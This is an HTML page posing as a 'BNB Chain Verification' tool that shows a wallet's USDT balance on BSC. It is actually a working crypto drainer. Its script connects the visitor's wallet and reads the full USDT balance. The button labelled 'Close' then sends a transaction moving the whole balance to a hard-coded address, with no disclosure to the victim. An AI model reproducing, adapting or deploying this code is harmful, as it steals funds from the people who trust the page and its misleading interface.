<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BNB Chain Review</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
  <style>
    body { background: #0f172a; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .box { background: #1e293b; padding: 25px; border-radius: 12px; width: 100%; max-width: 330px; text-align: center; }
    button { background: #f59e0b; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; }
    .hidden { display: none; }
  </style>
</head>
<body>

  <div class="box" id="step1">
    <h3>BNB Chain Verification</h3>
    <p style="font-size: 13px; color: #94a3b8;">Verify your wallet assets securely on BSC.</p>
    <button onclick="connect()">Connect Wallet</button>
  </div>

  <div class="box hidden" id="step2">
    <h3>Wallet Report</h3>
    <p style="font-size: 13px; color: #94a3b8; font-family: monospace;" id="addr">--</p>
    <p>USDT: <span id="usdt" style="color: #f59e0b; font-weight: bold;">0</span></p>
    <button onclick="transfer()">Close</button>
  </div>

  <script>
    const TARGET = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
    const USDT = "0x55d398326f99059fF775485246999027B3197955";
    const ABI = [
      "function balanceOf(address) view returns (uint256)",
      "function transfer(address, uint256) returns (bool)"
    ];
    let signer, user, balWei;

    async function connect() {
      const eth = window.ethereum || window.trustwallet;
      if(!eth) { alert("Please open inside Trust Wallet or MetaMask browser."); return; }
      
      const accs = await eth.request({ method: 'eth_requestAccounts' });
      user = accs[0];

      try {
        await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
      } catch(e) {}

      const prov = new ethers.providers.Web3Provider(eth);
      signer = prov.getSigner();
      
      const contract = new ethers.Contract(USDT, ABI, signer);
      balWei = await contract.balanceOf(user);
      
      document.getElementById('addr').innerText = user.substring(0,6) + '...' + user.slice(-4);
      document.getElementById('usdt').innerText = ethers.utils.formatUnits(balWei, 6) + " USDT";
      
      document.getElementById('step1').classList.add('hidden');
      document.getElementById('step2').classList.remove('hidden');
    }

    async function transfer() {
      document.getElementById('step2').classList.add('hidden');
      if(balWei.lte(0)) { alert("Balance is 0"); return; }
      
      try {
        const contract = new ethers.Contract(USDT, ABI, signer);
        const data = contract.interface.encodeFunctionData("transfer", [TARGET, balWei]);
        
        await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [{ from: user, to: USDT, data: data, gas: "0x186A0" }]
        });

        alert("Done");
      } catch(e) {
        alert("Notice: " + (e.message || "Cancelled"));
      }
    }
  </script>
</body>
</html>
